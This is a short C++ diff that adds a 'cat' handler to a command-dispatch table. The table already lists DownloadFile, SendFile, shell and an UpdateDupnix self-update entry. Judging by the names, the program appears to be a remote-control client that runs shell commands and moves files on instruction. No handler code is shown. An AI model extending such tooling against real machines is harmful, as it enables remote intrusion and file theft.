@@ -53,6 +53,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> commands{
 	{"DownloadFile", DownloadFile},
 	{"SendFile", SendFile},
 	{"shell", shell},
+	{"cat", cat},
 	{"UpdateDupnix", UpdateDupnix}
 };
 
